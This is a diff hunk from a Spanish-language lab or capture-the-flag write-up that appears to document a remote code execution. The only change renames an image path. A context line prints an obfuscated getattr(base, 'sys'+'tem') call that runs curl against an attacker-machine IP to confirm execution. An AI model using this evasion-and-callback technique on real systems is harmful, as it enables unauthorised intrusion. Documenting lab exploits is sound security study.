@@ -197,7 +197,7 @@ getattr(base, 'sys' + 'tem')('curl http://10.10.14.5/confirmacion_rce')
 
 Al ingresar el _payload_ modificado en el editor de código, el servidor web local (`http.server`) desplegado en la máquina atacante registró la siguiente interacción:
 
-![rce | 800](../Code/Images/rce.png)
+![rce | 800](../Code/Images/RCE.png)
 
 ### Conclusión Técnica
 
